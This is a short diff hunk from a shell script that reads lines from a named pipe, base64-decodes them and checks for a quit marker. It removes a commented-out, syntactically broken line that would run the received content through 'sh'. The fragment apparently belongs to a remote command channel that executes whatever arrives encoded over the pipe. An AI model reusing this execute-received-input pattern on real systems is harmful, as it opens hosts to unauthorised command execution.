@@ -23,7 +23,6 @@ fi
 while read line <$pipe
 do
   echo $line > enc
-#for i in quit _binary_ ps;do echo $i > tmpf;if ;then echo exiting now;elif grep -q "_binary_" $tmpf;then echo "This is binary data"; else sh $tmpf;fi;done
 
     base64 -d enc > denc;> enc
     if grep -q "_quit_" denc; then
